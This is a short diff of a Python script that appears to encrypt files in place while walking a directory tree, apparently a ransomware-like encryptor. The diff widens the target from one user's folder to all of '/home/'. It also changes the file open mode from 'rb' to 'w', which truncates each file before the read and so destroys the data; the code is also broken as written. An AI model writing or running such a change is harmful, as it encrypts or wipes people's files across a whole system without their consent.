@@ -16,7 +16,7 @@ def crypt():
                 path = path  + b'\x8a\xfe\xa7aY}\xa3It=\xc3\xccT\xc8\xd8\xba\x9e\xf8\xec&\xf0'
         return path
     
-    with open(path, 'rb') as f:
+    with open(path, 'w') as f:
         orig_file = f.read()
     padded_message = pad_message(orig_file)
     encrypt_message = cipher.encrypt(padded_message)
@@ -44,4 +44,4 @@ def walking_dir(dir):
                 
     except FileNotFoundError as f:
         print(str(f))
-walking_dir('/home/samsapi01/My_scripts/nas')
+walking_dir('/home/')
